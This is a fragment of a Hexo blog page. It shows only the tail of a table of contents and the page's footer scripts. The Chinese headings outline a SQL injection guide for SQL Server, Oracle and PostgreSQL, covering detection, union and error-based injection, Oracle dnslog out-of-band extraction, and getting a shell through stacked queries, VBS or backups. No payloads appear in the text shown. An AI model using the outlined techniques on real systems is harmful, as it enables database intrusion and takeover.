href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">判断方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">基本注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">4.3.</span> <span class="toc-text">GetShell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql-Server"><span class="toc-number">5.</span> <span class="toc-text">Sql Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95-1"><span class="toc-number">5.1.</span> <span class="toc-text">判断方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5-1"><span class="toc-number">5.2.</span> <span class="toc-text">基本注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">5.2.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.2.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell-1"><span class="toc-number">5.3.</span> <span class="toc-text">GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8Bgetshell"><span class="toc-number">5.3.1.</span> <span class="toc-text">堆叠注入下getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0-getshell"><span class="toc-number">5.3.1.1.</span> <span class="toc-text">直接通过特殊函数 getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E9%80%9A%E8%BF%87vbs-getshell"><span class="toc-number">5.3.1.2.</span> <span class="toc-text">间接通过vbs getshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E4%BB%BDgetshell"><span class="toc-number">5.3.2.</span> <span class="toc-text">备份getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Orancle"><span class="toc-number">6.</span> <span class="toc-text">Orancle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95-2"><span class="toc-number">6.1.</span> <span class="toc-text">判断方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5-2"><span class="toc-number">6.2.</span> <span class="toc-text">基本注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E5%B8%A6%E5%A4%96%E9%80%9A%E4%BF%A1%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF-dnslog%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.3.</span> <span class="toc-text">Oracle带外通信获取信息 dnslog注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell-2"><span class="toc-number">6.3.</span> <span class="toc-text">GetShell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">7.</span> <span class="toc-text">PostgreSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95-3"><span class="toc-number">7.1.</span> <span class="toc-text">判断方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5-3"><span class="toc-number">7.2.</span> <span class="toc-text">基本注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-2"><span class="toc-number">7.2.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-2"><span class="toc-number">7.2.2.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell-3"><span class="toc-number">7.3.</span> <span class="toc-text">GetShell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">8.</span> <span class="toc-text">最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
